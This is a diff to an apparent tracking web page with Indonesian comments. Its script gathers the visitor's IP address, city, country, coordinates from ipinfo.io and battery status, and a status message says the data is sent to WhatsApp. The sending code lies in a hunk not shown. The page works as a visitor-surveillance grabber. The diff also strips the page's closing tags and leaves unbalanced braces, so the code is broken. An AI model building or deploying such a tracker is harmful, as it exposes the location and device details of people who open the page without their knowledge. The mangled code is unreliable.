@@ -57,19 +57,25 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.min.js"></script>
 <script>
     async function trackAndSend() {
-        document.getElementById("status").innerText = "Memulai pelacakan...";
+    document.getElementById("status").innerText = "Memulai pelacakan...";
 
-        // Mendapatkan informasi lokasi menggunakan GeoJS
-        const geoData = await fetch('https://get.geojs.io/v1/ip/geo')
-            .then(response => response.json())
-            .catch(error => console.error('Error getting geolocation:', error));
+    try {
+        // Mendapatkan informasi lokasi menggunakan IPinfo.io
+        const geoData = await fetch('https://ipinfo.io/json')
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Gagal mengakses API IPinfo.io');
+                }
+                return response.json();
+            });
 
         if (geoData) {
             const ip = geoData.ip;
             const city = geoData.city;
             const country = geoData.country;
-            const latitude = geoData.latitude;
-            const longitude = geoData.longitude;
+            const location = geoData.loc.split(',');
+            const latitude = location[0];
+            const longitude = location[1];
 
             // Mendapatkan informasi baterai perangkat
             const battery = await navigator.getBattery();
@@ -102,10 +108,9 @@
             // Update status
             document.getElementById("status").innerText = "Data terkirim ke WA!";
         } else {
-            document.getElementById("status").innerText = "Gagal mendapatkan data lokasi.";
+            throw new Error('Data lokasi tidak ditemukan.');
         }
+    } catch (error) {
+        document.getElementById("status").innerText = `Error: ${error.message}`;
     }
-</script>
-
-</body>
-</html>
+        }
